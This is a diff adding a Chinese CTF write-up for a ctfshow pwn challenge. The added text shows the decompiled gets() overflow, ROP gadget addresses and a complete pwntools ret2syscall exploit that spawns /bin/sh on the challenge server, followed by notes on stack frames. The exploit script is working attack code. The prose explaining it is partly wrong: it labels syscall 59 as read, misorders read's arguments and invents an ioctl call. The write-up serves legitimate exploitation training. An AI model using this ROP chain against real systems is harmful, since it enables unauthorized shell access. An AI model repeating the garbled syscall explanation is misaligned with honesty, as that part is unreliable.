@@ -5264,6 +5264,149 @@ r.interactive()
 
 
 
+check64位nx开启
+
+```c
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  char v4[80]; // [rsp+0h] [rbp-50h] BYREF
+
+  setvbuf(stdout, 0LL, 2LL, 0LL);
+  setvbuf(stdin, 0LL, 1LL, 0LL);
+  puts("CTFshowPWN!");
+  puts("where is my system_x64?");
+  gets(v4);
+  puts("fuck");
+  return 0;
+}
+```
+
+
+
+搜索发现没有字符串/bin/sh，所以要用read来进行写入
+
+
+
+并且查询得64位的execve的系统调用号为59
+
+![image-20241107210936108](../_media/image-20241107210936108.png)
+
+
+
+并且需要rdi、rsi、rdx传入三个参数
+
+并且还要知道rax，总共四个寄存器的地址，那就直接ROPgadget
+
+![image-20241107211133988](../_media/image-20241107211133988.png)
+
+```
+pop_rax = 0x000000000046b9f8
+pop_rdi = 0x00000000004016c3
+pop_rsi = 0x00000000004017d7
+pop_rdx = 0x00000000004377d5
+```
+
+
+
+此外由于没有放字符串的位置，所以我们在bss区随便一个空闲位置放就可以了
+
+![image-20241107211804914](../_media/image-20241107211804914.png)
+
+这里取
+
+```
+bss_addr = 0x00000000006C1C61
+```
+
+
+
+ida搜索系统调用syscall
+
+使用那个time的
+
+![image-20241107212727128](../_media/image-20241107212727128.png)
+
+```
+syscall_ret=0x00000000045BAC5
+```
+
+
+
+
+
+cyclic计算偏移量得到offset为88
+
+![image-20241107211508177](../_media/image-20241107211508177.png)
+
+
+
+然后我们利用ioctl函数进行交互
+
+![image-20241107213507470](../_media/image-20241107213507470.png)
+
+需要传3个参数，分别是fd，cmd，arg
+
+
+
+payload部分也是可以预料到的
+
+从后往前看syscall系统中断，然后rdx=0，rsi=0，rdi=bss的地址，然后59系统调用号是read，rax=59，就运行read函数读取我们输入进去的值到bss地址，
+
+就是调用read(bss_addr,0,0)
+
+然后继续系统调用，rdx=0x10，说明调用ioctl函数，rsi=bss的值，也就是要执行的cmd，rdi=0默认，然后rax执行
+
+
+
+最终exp：
+
+```python
+# -*- coding: utf-8 -*-
+from pwn import *
+from LibcSearcher import *
+from struct import pack
+import pwnlib
+context(arch='amd64',os='linux',log_level='debug')
+
+ip = "pwn.challenge.ctf.show"
+port = 28246
+elf = ELF('./pwn')
+
+# r = process('./pwn')
+# pwnlib.gdb.attach(r)
+r = remote(ip,port)
+
+bss_addr=0x0000000006C1C61
+
+syscall_ret=0x00000000045BAC5
+
+pop_rax=0x000000000046b9f8 
+
+pop_rdi=0x00000000004016c3
+
+pop_rsi=0x00000000004017d7
+
+pop_rdx=0x00000000004377d5
+
+r.recvuntil("system_x64?\n")
+
+payload =b"a"*(0x50+8)+p64(pop_rax)+p64(0)+p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(bss_addr)+p64(pop_rdx)+p64(0x10)+p64(syscall_ret)
+payload += p64(pop_rax)+p64(59)+p64(pop_rdi)+p64(bss_addr)+p64(pop_rsi)+p64(0)+p64(pop_rdx)+p64(0)+p64(syscall_ret)
+r.sendline(payload)
+r.sendline("/bin/sh\x00")
+r.interactive()
+```
+
+
+
+
+
+最终拿到flag：
+
+```
+ctfshow{d0b3d9dd-700e-4872-b761-862f57472b20}
+```
+
 
 
 ## 79. pwn79
@@ -6632,3 +6775,31 @@ ret2syscall
 那么ret2text——程序中有system("/bin/sh")代码段，控制流执行
 那么ret2shellcode——程序中不存在system("/bin/sh/")的代码段，自己恶意填入代码并在可执行段执行 
 那么ret2syscall——程序中不存在system("/bin/sh/")的代码段，不存在合适的可执行段进行恶意代码的执行，但是程序是静态链接，且程序中中存在代码片段，拼接可组成系统调用 
+
+
+
+
+
+
+
+函数跳转时候的栈变化
+
+函数调用可以分解为如下步骤：
+
+- 父函数将调用参数从后向前压栈
+- 将返回地址压栈保存
+- 跳转到子函数起始地址执行
+- 子函数将父函数栈帧起始地址 rpb 压栈
+- 将 rbp 的值设置为当前 rsp 的值，即将 rbp 指向子函数栈帧的起始地址
+
+上述过程中，保存返回地址和跳转到子函数处执行由 call 一条指令完成，在 call 指令执行完成时，已经进入了子程序中，因而将上一栈帧 rbp 压栈的操作，需要由子程序来完成
+
+
+
+返回：
+
+函数返回时，返回值保存在 rax 寄存器中。之后需要将栈的结构恢复到函数调用之前的状态，并跳转到父函数的返回地址处继续执行
+由于函数调用时已经保存了返回地址和父函数栈帧的起始地址，要恢复到子函数调用之前的父栈帧，我们只需要执行以下两条指令：
+
+
+
